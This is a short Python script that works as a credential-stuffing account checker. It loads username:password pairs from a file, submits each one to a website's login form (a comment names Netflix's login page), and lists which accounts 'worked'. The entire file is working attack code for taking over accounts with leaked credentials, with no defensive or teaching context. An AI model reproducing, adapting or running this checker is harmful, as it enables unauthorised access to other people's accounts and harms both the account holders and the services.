import mechanize

br = mechanize.Browser()
#br.set_all_readonly(False)
br.set_handle_robots(False)
br.set_handle_refresh(False)
#br.set_debug_http(True)
br.addheaders = [('User-agent', 'Firefox')]

def setup():
	info = raw_input("Enter the file name: ")
	details = dict()
	with open(info) as f:
		detailsList = f.readlines()
	for x in range(len(detailsList)):
		detailsList[x] = detailsList[x].rstrip('\n')
	main(detailsList)

def main(detailsList):
	site = raw_input("What site do you want to test? ") #https://www.netflix.com/Login
	good = list()
	bad = list()
	for info in detailsList:
		username = info.split(':')[0]
		password = info.split(':')[1]
		loginPage = br.open(site)
		br.form = list(br.forms())[0]
		br["email"] = username
		br["password"] = password
		response = br.submit()
		if('The login information you entered does not match an account in our records. Remember, your email address is not case-sensitive, but passwords are.' in response.read()):
			bad.append(username + ":" + password)
		else:
			good.append(username + ":" + password)
	printDetails(good, bad)

def printDetails(good, bad):
	#print(len(good) + len(bad))
	#print((len(good) / (len(good) + len(bad))) * 100)
	print('Out of ' + str(len(good) + len(bad)) + ' accounts, ' + str((len(good) / (len(good) + len(bad))) * 100) + '% of them worked! These accounts follow:\n')
	for account in good:
		print(account)
	seeBad = raw_input('Do you want to see the bad accounts?\n ')
	if(seeBad.lower() == 'yes' or seeBad.lower() == 'y'):
		for account in bad:
			print(account)
	else:
		exit()

setup()
